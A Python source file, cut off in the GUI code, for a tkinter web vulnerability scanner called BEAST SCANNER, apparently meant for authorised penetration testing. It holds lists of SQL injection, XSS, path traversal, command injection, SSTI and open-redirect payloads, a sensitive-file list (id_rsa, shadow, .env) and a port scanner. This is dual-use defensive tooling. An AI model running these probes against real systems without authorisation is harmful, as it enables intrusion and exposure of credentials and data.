#!/usr/bin/env python3
"""
██████╗ ███████╗ █████╗ ███████╗████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╗  ███████║███████╗   ██║       ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██████╔╝███████╗██║  ██║███████║   ██║       ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝

Advanced Web Application Vulnerability Scanner v2.0
For Authorized Penetration Testing Only
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, font
import threading
import requests
import socket
import ssl
import re
import json
import urllib.parse
from datetime import datetime
import concurrent.futures
import hashlib
import random
import time
import os
from collections import defaultdict

# Suppress warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CyberTheme:
    """Modern Hacking Theme Configuration"""
    
    # Color Palette
    BG_DARK = "#0a0a0f"
    BG_MEDIUM = "#12121a"
    BG_LIGHT = "#1a1a2e"
    BG_CARD = "#16213e"
    
    NEON_GREEN = "#00ff41"
    NEON_CYAN = "#00d4ff"
    NEON_PURPLE = "#bf00ff"
    NEON_RED = "#ff0040"
    NEON_ORANGE = "#ff6600"
    NEON_YELLOW = "#ffff00"
    
    TEXT_PRIMARY = "#ffffff"
    TEXT_SECONDARY = "#8892b0"
    TEXT_DIM = "#4a5568"
    
    SUCCESS = "#00ff41"
    WARNING = "#ffff00"
    ERROR = "#ff0040"
    INFO = "#00d4ff"
    CRITICAL = "#ff0040"
    HIGH = "#ff6600"
    MEDIUM = "#ffff00"
    LOW = "#00d4ff"
    
    # Fonts
    FONT_FAMILY = "Consolas"
    FONT_FAMILY_ALT = "Courier New"


class AnimatedLabel(tk.Label):
    """Animated text label with typing effect"""
    
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)
        self.full_text = ""
        self.current_index = 0
        
    def animate_text(self, text, delay=50):
        self.full_text = text
        self.current_index = 0
        self._type_next(delay)
        
    def _type_next(self, delay):
        if self.current_index <= len(self.full_text):
            self.config(text=self.full_text[:self.current_index])
            self.current_index += 1
            self.after(delay, lambda: self._type_next(delay))


class GlowButton(tk.Canvas):
    """Custom button with glow effect"""
    
    def __init__(self, master, text, command, color=CyberTheme.NEON_GREEN, width=150, height=40):
        super().__init__(master, width=width, height=height, 
                        bg=CyberTheme.BG_DARK, highlightthickness=0)
        
        self.command = command
        self.color = color
        self.text = text
        self.width = width
        self.height = height
        self.is_hovered = False
        
        self.draw_button()
        
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        self.bind("<Button-1>", self.on_click)
        
    def draw_button(self):
        self.delete("all")
        
        # Glow effect when hovered
        if self.is_hovered:
            for i in range(3):
                self.create_rectangle(
                    2-i, 2-i, self.width-2+i, self.height-2+i,
                    outline=self.color, width=1
                )
        
        # Main border
        self.create_rectangle(
            2, 2, self.width-2, self.height-2,
            outline=self.color, width=2,
            fill=CyberTheme.BG_MEDIUM if self.is_hovered else ""
        )
        
        # Text
        self.create_text(
            self.width//2, self.height//2,
            text=self.text, fill=self.color,
            font=(CyberTheme.FONT_FAMILY, 10, "bold")
        )
        
    def on_enter(self, event):
        self.is_hovered = True
        self.draw_button()
        
    def on_leave(self, event):
        self.is_hovered = False
        self.draw_button()
        
    def on_click(self, event):
        if self.command:
            self.command()


class PulsingIndicator(tk.Canvas):
    """Pulsing status indicator"""
    
    def __init__(self, master, size=20, color=CyberTheme.NEON_GREEN):
        super().__init__(master, width=size, height=size,
                        bg=CyberTheme.BG_DARK, highlightthickness=0)
        self.size = size
        self.color = color
        self.pulse_size = 0
        self.is_pulsing = False
        self.draw_indicator()
        
    def draw_indicator(self):
        self.delete("all")
        center = self.size // 2
        
        # Pulse ring
        if self.is_pulsing and self.pulse_size > 0:
            self.create_oval(
                center - self.pulse_size, center - self.pulse_size,
                center + self.pulse_size, center + self.pulse_size,
                outline=self.color, width=1
            )
        
        # Core circle
        core_size = 4
        self.create_oval(
            center - core_size, center - core_size,
            center + core_size, center + core_size,
            fill=self.color, outline=self.color
        )
        
    def start_pulse(self):
        self.is_pulsing = True
        self._animate_pulse()
        
    def stop_pulse(self):
        self.is_pulsing = False
        self.pulse_size = 0
        self.draw_indicator()
        
    def _animate_pulse(self):
        if not self.is_pulsing:
            return
            
        self.pulse_size = (self.pulse_size + 1) % (self.size // 2)
        self.draw_indicator()
        self.after(50, self._animate_pulse)


class VulnerabilityScanner:
    """Core vulnerability scanning engine"""
    
    def __init__(self, callback=None):
        self.callback = callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.scan_results = {}
        
        # Payloads
        self.sql_payloads = [
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "\" OR \"1\"=\"1", "' OR 1=1--", "' OR 'x'='x",
            "1' ORDER BY 1--", "1' ORDER BY 10--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1 AND 1=1", "1 AND 1=2", "1' AND '1'='1",
            "'; DROP TABLE users--", "' OR ''='",
            "admin'--", "admin' #", "') OR ('1'='1",
            "1; SELECT * FROM users", "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "'\"><script>alert('XSS')</script>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<math><maction actiontype=\"statusline#http://google.com\">",
            "<a href=\"javascript:alert('XSS')\">Click</a>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('XSS')}",
            "<img src=x onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd%00",
            "....//....//....//etc/passwd%00",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "expect://id",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        ]
        
        self.rce_payloads = [
            "; ls -la", "| ls -la", "& ls -la",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "`id`", "$(id)", "; id", "| id",
            "& whoami", "; whoami", "| whoami",
            "\n/bin/cat /etc/passwd",
            "; ping -c 3 127.0.0.1",
        ]
        
        self.ssti_payloads = [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>",
            "{{config}}", "{{self}}", "{{''.__class__}}",
            "#{7*7}", "*{7*7}", "@(7*7)",
            "{{request.application.__globals__}}",
        ]
        
        self.open_redirect_payloads = [
            "//evil.com", "https://evil.com",
            "/\\evil.com", "//evil.com/%2f..",
            "////evil.com", "https:evil.com",
            "//evil%E3%80%82com",
        ]
        
        self.common_dirs = [
            "admin", "administrator", "login", "wp-admin", "phpmyadmin",
            "cpanel", "webmail", "ftp", "backup", "backups",
            "db", "database", "sql", "mysql", "api",
            "v1", "v2", "swagger", "docs", "documentation",
            "test", "testing", "dev", "development", "staging",
            "config", "configuration", "settings", "setup", "install",
            "uploads", "upload", "files", "images", "media",
            ".git", ".svn", ".env", ".htaccess", "robots.txt",
            "sitemap.xml", "crossdomain.xml", "security.txt",
            "server-status", "server-info", "phpinfo.php",
            "wp-content", "wp-includes", "wp-config.php.bak",
            "console", "shell", "cmd", "terminal", "manager",
        ]
        
        self.sensitive_files = [
            ".git/config", ".git/HEAD", ".svn/entries",
            ".env", ".env.local", ".env.production",
            "config.php", "config.inc.php", "configuration.php",
            "database.yml", "settings.py", "wp-config.php",
            "web.config", "appsettings.json", "secrets.json",
            ".htpasswd", ".htaccess", "passwd", "shadow",
            "id_rsa", "id_dsa", "authorized_keys",
            "backup.sql", "dump.sql", "database.sql",
            "error_log", "access_log", "debug.log",
            "phpinfo.php", "info.php", "test.php",
        ]
        
    def log(self, message, level="INFO"):
        if self.callback:
            self.callback(message, level)
            
    def add_vulnerability(self, vuln_type, severity, url, details, evidence=""):
        vuln = {
            "type": vuln_type,
            "severity": severity,
            "url": url,
            "details": details,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        self.log(f"[{severity}] {vuln_type}: {details}", severity)
        
    def make_request(self, url, method="GET", data=None, headers=None, timeout=10):
        try:
            if method == "GET":
                response = self.session.get(url, headers=headers, 
                                           verify=False, timeout=timeout)
            else:
                response = self.session.post(url, data=data, headers=headers,
                                            verify=False, timeout=timeout)
            return response
        except Exception as e:
            return None
            
    def scan_sql_injection(self, url, params=None):
        self.log("[*] Starting SQL Injection scan...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        if not query_params and not params:
            self.log("[!] No parameters found to test", "WARNING")
            return
            
        test_params = params if params else query_params
        
        for param in test_params:
            for payload in self.sql_payloads:
                test_url = url.replace(f"{param}={test_params[param][0] if isinstance(test_params[param], list) else test_params[param]}", 
                                       f"{param}={urllib.parse.quote(payload)}")
                
                response = self.make_request(test_url)
                if response:
                    # Check for SQL error messages
                    sql_errors = [
                        "mysql", "mysqli", "sql syntax", "query failed",
                        "postgresql", "sqlite", "oracle", "sqlserver",
                        "syntax error", "unclosed quotation", "unterminated",
                        "odbc", "jdbc", "ORA-", "PLS-", "SP2-",
                        "Warning: mysql", "Warning: pg_", "Warning: oci_",
                        "You have an error in your SQL syntax",
                        "quoted string not properly terminated",
                        "Microsoft OLE DB Provider for SQL Server",
                        "Incorrect syntax near", "Invalid query",
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            self.add_vulnerability(
                                "SQL Injection",
                                "CRITICAL",
                                test_url,
                                f"SQL error detected in parameter '{param}'",
                                f"Payload: {payload}\nError: {error}"
                            )
                            break
                            
                    # Time-based detection
                    if "SLEEP" in payload or "WAITFOR" in payload:
                        start = time.time()
                        self.make_request(test_url, timeout=15)
                        elapsed = time.time() - start
                        if elapsed >= 5:
                            self.add_vulnerability(
                                "SQL Injection (Time-Based)",
                                "CRITICAL",
                                test_url,
                                f"Time-based SQL injection in parameter '{param}'",
                                f"Payload: {payload}\nResponse time: {elapsed:.2f}s"
                            )
                            
    def scan_xss(self, url, params=None):
        self.log("[*] Starting XSS scan...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        if not query_params and not params:
            self.log("[!] No parameters found to test", "WARNING")
            return
            
        test_params = params if params else query_params
        
        for param in test_params:
            for payload in self.xss_payloads:
                original_value = test_params[param][0] if isinstance(test_params[param], list) else test_params[param]
                test_url = url.replace(f"{param}={original_value}", 
                                       f"{param}={urllib.parse.quote(payload)}")
                
                response = self.make_request(test_url)
                if response:
                    # Check if payload is reflected
                    if payload in response.text or urllib.parse.unquote(payload) in response.text:
                        # Check if it's in a dangerous context
                        dangerous_contexts = [
                            f'<script>{payload}',
                            f"'{payload}",
                            f'"{payload}',
                            f'on\\w+\\s*=\\s*["\']?{re.escape(payload)}',
                        ]
                        
                        is_dangerous = any(re.search(ctx, response.text, re.IGNORECASE) 
                                          for ctx in dangerous_contexts)
                        
                        severity = "HIGH" if is_dangerous else "MEDIUM"
                        
                        self.add_vulnerability(
                            "Cross-Site Scripting (XSS)",
                            severity,
                            test_url,
                            f"XSS payload reflected in parameter '{param}'",
                            f"Payload: {payload}"
                        )
                        
    def scan_lfi(self, url, params=None):
        self.log("[*] Starting LFI/Path Traversal scan...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        if not query_params and not params:
            return
            
        test_params = params if params else query_params
        
        for param in test_params:
            for payload in self.lfi_payloads:
                original_value = test_params[param][0] if isinstance(test_params[param], list) else test_params[param]
                test_url = url.replace(f"{param}={original_value}", 
                                       f"{param}={urllib.parse.quote(payload)}")
                
                response = self.make_request(test_url)
                if response:
                    # Check for file contents
                    lfi_indicators = [
                        "root:x:0:0", "daemon:", "/bin/bash",
                        "[fonts]", "[extensions]", "localhost",
                        "<?php", "<?=", "base64,",
                    ]
                    
                    for indicator in lfi_indicators:
                        if indicator in response.text:
                            self.add_vulnerability(
                                "Local File Inclusion",
                                "CRITICAL",
                                test_url,
                                f"LFI vulnerability in parameter '{param}'",
                                f"Payload: {payload}\nIndicator: {indicator}"
                            )
                            break
                            
    def scan_rce(self, url, params=None):
        self.log("[*] Starting RCE scan...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        if not query_params and not params:
            return
            
        test_params = params if params else query_params
        
        for param in test_params:
            for payload in self.rce_payloads:
                original_value = test_params[param][0] if isinstance(test_params[param], list) else test_params[param]
                test_url = url.replace(f"{param}={original_value}", 
                                       f"{param}={urllib.parse.quote(payload)}")
                
                response = self.make_request(test_url)
                if response:
                    # Check for command output
                    rce_indicators = [
                        "uid=", "gid=", "groups=",
                        "root:", "www-data", "apache",
                        "PING", "bytes from", "ttl=",
                        "Volume Serial", "Directory of",
                    ]
                    
                    for indicator in rce_indicators:
                        if indicator in response.text:
                            self.add_vulnerability(
                                "Remote Code Execution",
                                "CRITICAL",
                                test_url,
                                f"RCE vulnerability in parameter '{param}'",
                                f"Payload: {payload}\nIndicator: {indicator}"
                            )
                            break
                            
    def scan_ssti(self, url, params=None):
        self.log("[*] Starting SSTI scan...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        if not query_params and not params:
            return
            
        test_params = params if params else query_params
        
        for param in test_params:
            for payload in self.ssti_payloads:
                original_value = test_params[param][0] if isinstance(test_params[param], list) else test_params[param]
                test_url = url.replace(f"{param}={original_value}", 
                                       f"{param}={urllib.parse.quote(payload)}")
                
                response = self.make_request(test_url)
                if response:
                    # Check for template evaluation
                    if "49" in response.text and "7*7" in payload:
                        self.add_vulnerability(
                            "Server-Side Template Injection",
                            "CRITICAL",
                            test_url,
                            f"SSTI vulnerability in parameter '{param}'",
                            f"Payload: {payload}"
                        )
                        
    def scan_open_redirect(self, url, params=None):
        self.log("[*] Starting Open Redirect scan...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        redirect_params = ["url", "redirect", "next", "return", "returnurl",
                          "goto", "destination", "redir", "redirect_uri",
                          "return_to", "checkout_url", "continue"]
        
        if not query_params and not params:
            return
            
        test_params = params if params else query_params
        
        for param in test_params:
            if param.lower() in redirect_params:
                for payload in self.open_redirect_payloads:
                    original_value = test_params[param][0] if isinstance(test_params[param], list) else test_params[param]
                    test_url = url.replace(f"{param}={original_value}", 
                                           f"{param}={urllib.parse.quote(payload)}")
                    
                    response = self.make_request(test_url)
                    if response and response.history:
                        for redirect in response.history:
                            if "evil.com" in redirect.headers.get("Location", ""):
                                self.add_vulnerability(
                                    "Open Redirect",
                                    "MEDIUM",
                                    test_url,
                                    f"Open redirect in parameter '{param}'",
                                    f"Payload: {payload}"
                                )
                                break
                                
    def scan_directories(self, url):
        self.log("[*] Starting directory enumeration...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        found_dirs = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {}
            for directory in self.common_dirs:
                test_url = f"{base_url}/{directory}"
                futures[executor.submit(self.make_request, test_url)] = directory
                
            for future in concurrent.futures.as_completed(futures):
                directory = futures[future]
                try:
                    response = future.result()
                    if response and response.status_code in [200, 301, 302, 403]:
                        found_dirs.append({
                            "path": f"/{directory}",
                            "status": response.status_code,
                            "size": len(response.content)
                        })
                        
                        severity = "MEDIUM" if response.status_code == 200 else "LOW"
                        if directory in [".git", ".env", "backup", "admin", "phpmyadmin"]:
                            severity = "HIGH"
                            
                        self.add_vulnerability(
                            "Directory Found",
                            severity,
                            f"{base_url}/{directory}",
                            f"Directory discovered: /{directory} (Status: {response.status_code})",
                            f"Response size: {len(response.content)} bytes"
                        )
                except Exception:
                    pass
                    
        return found_dirs
        
    def scan_sensitive_files(self, url):
        self.log("[*] Scanning for sensitive files...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {}
            for file in self.sensitive_files:
                test_url = f"{base_url}/{file}"
                futures[executor.submit(self.make_request, test_url)] = file
                
            for future in concurrent.futures.as_completed(futures):
                file = futures[future]
                try:
                    response = future.result()
                    if response and response.status_code == 200:
                        # Verify it's not a generic error page
                        if len(response.content) > 0:
                            self.add_vulnerability(
                                "Sensitive File Exposure",
                                "HIGH",
                                f"{base_url}/{file}",
                                f"Sensitive file accessible: {file}",
                                f"Size: {len(response.content)} bytes"
                            )
                except Exception:
                    pass
                    
    def scan_headers(self, url):
        self.log("[*] Analyzing security headers...", "INFO")
        
        response = self.make_request(url)
        if not response:
            return
            
        security_headers = {
            "Strict-Transport-Security": "HSTS header missing - vulnerable to downgrade attacks",
            "X-Content-Type-Options": "X-Content-Type-Options missing - vulnerable to MIME sniffing",
            "X-Frame-Options": "X-Frame-Options missing - vulnerable to clickjacking",
            "X-XSS-Protection": "X-XSS-Protection missing",
            "Content-Security-Policy": "CSP header missing - vulnerable to XSS",
            "Referrer-Policy": "Referrer-Policy missing",
            "Permissions-Policy": "Permissions-Policy missing",
            "X-Permitted-Cross-Domain-Policies": "Cross-domain policy header missing",
        }
        
        for header, message in security_headers.items():
            if header not in response.headers:
                self.add_vulnerability(
                    "Missing Security Header",
                    "LOW",
                    url,
                    message,
                    f"Header: {header}"
                )
                
        # Check for information disclosure headers
        disclosure_headers = ["Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version"]
        for header in disclosure_headers:
            if header in response.headers:
                self.add_vulnerability(
                    "Information Disclosure",
                    "LOW",
                    url,
                    f"Server information exposed via {header} header",
                    f"{header}: {response.headers[header]}"
                )
                
    def scan_ssl(self, url):
        self.log("[*] Analyzing SSL/TLS configuration...", "INFO")
        
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme != "https":
            self.add_vulnerability(
                "No HTTPS",
                "HIGH",
                url,
                "Website does not use HTTPS",
                "All traffic is transmitted in plaintext"
            )
            return
            
        try:
            context = ssl.create_default_context()
            conn = context.wrap_socket(
                socket.socket(socket.AF_INET),
                server_hostname=parsed.netloc
            )
            conn.settimeout(10)
            conn.connect((parsed.netloc, 443))
            
            cert = conn.getpeercert()
            
            # Check certificate expiration
            not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
            days_until_expiry = (not_after - datetime.now()).days
            
            if days_until_expiry < 0:
                self.add_vulnerability(
                    "SSL Certificate Expired",
                    "CRITICAL",
                    url,
                    "SSL certificate has expired",
                    f"Expired on: {cert['notAfter']}"
                )
            elif days_until_expiry < 30:
                self.add_vulnerability(
                    "SSL Certificate Expiring Soon",
                    "MEDIUM",
                    url,
                    f"SSL certificate expires in {days_until_expiry} days",
                    f"Expires on: {cert['notAfter']}"
                )
                
            # Check SSL version
            ssl_version = conn.version()
            if "TLSv1.0" in ssl_version or "TLSv1.1" in ssl_version:
                self.add_vulnerability(
                    "Weak TLS Version",
                    "MEDIUM",
                    url,
                    f"Server supports deprecated TLS version: {ssl_version}",
                    "TLS 1.0 and 1.1 are deprecated"
                )
                
            conn.close()
            
        except ssl.SSLError as e:
            self.add_vulnerability(
                "SSL Error",
                "HIGH",
                url,
                f"SSL configuration error: {str(e)}",
                ""
            )
        except Exception as e:
            self.log(f"[!] SSL scan error: {str(e)}", "WARNING")
            
    def scan_cors(self, url):
        self.log("[*] Checking CORS configuration...", "INFO")
        
        # Test with malicious origin
        headers = {"Origin": "https://evil.com"}
        response = self.make_request(url, headers=headers)
        
        if response:
            acao = response.headers.get("Access-Control-Allow-Origin", "")
            acac = response.headers.get("Access-Control-Allow-Credentials", "")
            
            if acao == "*":
                self.add_vulnerability(
                    "CORS Misconfiguration",
                    "MEDIUM",
                    url,
                    "CORS allows any origin (wildcard)",
                    f"Access-Control-Allow-Origin: {acao}"
                )
            elif "evil.com" in acao:
                severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                self.add_vulnerability(
                    "CORS Misconfiguration",
                    severity,
                    url,
                    "CORS reflects arbitrary origin",
                    f"Access-Control-Allow-Origin: {acao}\nAccess-Control-Allow-Credentials: {acac}"
                )
                
    def scan_cookies(self, url):
        self.log("[*] Analyzing cookies...", "INFO")
        
        response = self.make_request(url)
        if not response:
            return
            
        cookies = response.cookies
        
        for cookie in cookies:
            issues = []
            
            if not cookie.secure:
                issues.append("Secure flag not set")
            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("HttpOnly flag not set")
            if not cookie.has_nonstandard_attr("SameSite"):
                issues.append("SameSite attribute not set")
                
            if issues:
                self.add_vulnerability(
                    "Insecure Cookie",
                    "MEDIUM",
                    url,
                    f"Cookie '{cookie.name}' has security issues",
                    "\n".join(issues)
                )
                
    def scan_ports(self, host, ports=None):
        self.log("[*] Starting port scan...", "INFO")
        
        if ports is None:
            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 
                    993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 
                    6379, 8080, 8443, 8888, 27017]
        
        open_ports = []
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((host, port))
                sock.close()
                return port if result == 0 else None
            except:
                return None
                
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(check_port, ports)
            
        for port in results:
            if port:
                open_ports.append(port)
                service = self.get_service_name(port)
                
                severity = "INFO"
                if port in [21, 23, 3389, 5900]:
                    severity = "MEDIUM"
                elif port in [1433, 1521, 3306, 5432, 6379, 27017]:
                    severity = "HIGH"
                    
                self.add_vulnerability(
                    "Open Port",
                    severity,
                    f"{host}:{port}",
                    f"Port {port} ({service}) is open",
                    ""
                )
                
        return open_ports
        
    def get_service_name(self, port):
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
            443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
            1433: "MSSQL", 1521: "Oracle", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
            6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
            8888: "HTTP-Alt", 27017: "MongoDB"
        }
        return services.get(port, "Unknown")
        
    def scan_technologies(self, url):
        self.log("[*] Detecting technologies...", "INFO")
        
        response = self.make_request(url)
        if not response:
            return {}
            
        technologies = {}
        
        # Check headers
        server = response.headers.get("Server", "")
        powered_by = response.headers.get("X-Powered-By", "")
        
        if server:
            technologies["Server"] = server
        if powered_by:
            technologies["Framework"] = powered_by
            
        # Check HTML content
        html = response.text.lower()
        
        tech_patterns = {
            "WordPress": ["wp-content", "wp-includes", "wordpress"],
            "Drupal": ["drupal", "sites/default/files"],
            "Joomla": ["joomla", "/components/", "/modules/"],
            "Laravel": ["laravel", "csrf-token"],
            "Django": ["csrfmiddlewaretoken", "django"],
            "React": ["react", "_reactroot", "react-root"],
            "Vue.js": ["vue", "v-if", "v-for", "__vue__"],
            "Angular": ["ng-app", "angular", "ng-controller"],
            "jQuery": ["jquery", "jquery.min.js"],
            "Bootstrap": ["bootstrap", "bootstrap.min.css"],
            "Nginx": ["nginx"],
            "Apache": ["apache"],
            "PHP": [".php", "phpsessid"],
            "ASP.NET": ["asp.net", "aspx", "__viewstate"],
        }
        
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in html or pattern in str(response.headers).lower():
                    technologies[tech] = "Detected"
                    break
                    
        for tech, version in technologies.items():
            self.log(f"[+] Technology detected: {tech} - {version}", "INFO")
            
        return technologies
        
    def full_scan(self, url):
        """Run all vulnerability scans"""
        self.vulnerabilities = []
        self.log("=" * 60, "INFO")
        self.log("[*] BEAST SCANNER - Full Vulnerability Scan Started", "INFO")
        self.log(f"[*] Target: {url}", "INFO")
        self.log(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "INFO")
        self.log("=" * 60, "INFO")
        
        parsed = urllib.parse.urlparse(url)
        
        # Run all scans
        self.scan_technologies(url)
        self.scan_headers(url)
        self.scan_ssl(url)
        self.scan_cors(url)
        self.scan_cookies(url)
        self.scan_directories(url)
        self.scan_sensitive_files(url)
        self.scan_sql_injection(url)
        self.scan_xss(url)
        self.scan_lfi(url)
        self.scan_rce(url)
        self.scan_ssti(url)
        self.scan_open_redirect(url)
        self.scan_ports(parsed.netloc)
        
        self.log("=" * 60, "INFO")
        self.log(f"[*] Scan completed. Found {len(self.vulnerabilities)} vulnerabilities", "INFO")
        self.log("=" * 60, "INFO")
        
        return self.vulnerabilities


class BeastScannerGUI:
    """Main GUI Application"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BEAST SCANNER v2.0 - Advanced Web Vulnerability Scanner")
        self.root.geometry("1400x900")
        self.root.configure(bg=CyberTheme.BG_DARK)
        self.root.minsize(1200, 700)
        
        # Variables
        self.target_url = tk.StringVar()
        self.scan_running = False
        self.scanner = None
        
        self.setup_styles()
        self.create_widgets()
        self.animate_startup()
        
    def setup_styles(self):
        """Configure ttk styles"""
        style = ttk.Style()
        style.theme_use("clam")
        
        # Notebook style
        style.configure("TNotebook", 
                       background=CyberTheme.BG_DARK,
                       borderwidth=0)
        style.configure("TNotebook.Tab",
                       background=CyberTheme.BG_MEDIUM,
                       foreground=CyberTheme.TEXT_SECONDARY,
                       padding=[20, 10],
                       font=(CyberTheme.FONT_FAMILY, 10))
        style.map("TNotebook.Tab",
                 background=[("selected", CyberTheme.BG_LIGHT)],
                 foreground=[("selected", CyberTheme.NEON_GREEN)])
        
        # Frame style
        style.configure("Dark.TFrame",
                       background=CyberTheme.BG_DARK)
        
        # Label style
        style.configure("Cyber.TLabel",
                       background=CyberTheme.BG_DARK,
                       foreground=CyberTheme.TEXT_PRIMARY,
                       font=(CyberTheme.FONT_FAMILY, 10))
        
        # Entry style
        style.configure("Cyber.TEntry",
                       fieldbackground=CyberTheme.BG_MEDIUM,
                       foreground=CyberTheme.NEON_GREEN,
                       insertcolor=CyberTheme.NEON_GREEN)
        
        # Progressbar style
        style.configure("Cyber.Horizontal.TProgressbar",
                       background=CyberTheme.NEON_GREEN,
                       troughcolor=CyberTheme.BG_MEDIUM)
        
    def create_widgets(self):
        """Create all GUI widgets"""
        
        # Main container
        self.main_container = tk.Frame(self.root, bg=CyberTheme.BG_DARK)
        self.main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Header
        self.create_header()
        
        # Content area with notebook
        self.create_notebook()
        
        # Status bar
        self.create_status_bar()
        
    def create_header(self):
        """Create header section"""
        header_frame = tk.Frame(self.main_container, bg=CyberTheme.BG_DARK)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Logo/Title
        title_frame = tk.Frame(header_frame, bg=CyberTheme.BG_DARK)
        title_frame.pack(side=tk.LEFT)
        
        self.ascii_art = """
 ██████╗ ███████╗ █████╗ ███████╗████████╗
 ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝
 ██████╔╝█████╗  ███████║███████╗   ██║   
 ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║   
 ██████╔╝███████╗██║  ██║███████║   ██║   
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   """
        
        logo_label = tk.Label(
            title_frame,
            text=self.ascii_art,
            font=(CyberTheme.FONT_FAMILY, 8),
            fg=CyberTheme.NEON_GREEN,
            bg=CyberTheme.BG_DARK,
            justify=tk.LEFT
        )
        logo_label.pack(side=tk.LEFT)
        
        # Subtitle
        subtitle_frame = tk.Frame(title_frame, bg=CyberTheme.BG_DARK)
        subtitle_frame.pack(side=tk.LEFT, padx=20)
        
        tk.Label(
            subtitle_frame,
            text="ADVANCED WEB VULNERABILITY SCANNER",
            font=(CyberTheme.FONT_FAMILY, 14, "bold"),
            fg=CyberTheme.NEON_CYAN,
            bg=CyberTheme.BG_DARK
        ).pack(anchor=tk.W)
        
        tk.Label(
            subtitle_frame,
            text="For Authorized Penetration Testing Only",
            font=(CyberTheme.FONT_FAMILY, 10),
            fg=CyberTheme.TEXT_SECONDARY,
            bg=CyberTheme.BG_DARK
        ).pack(anchor=tk.W)
        
        # Status indicator
        status_frame = tk.Frame(header_frame, bg=CyberTheme.BG_DARK)
        status_frame.pack(side=tk.RIGHT, padx=10)
        
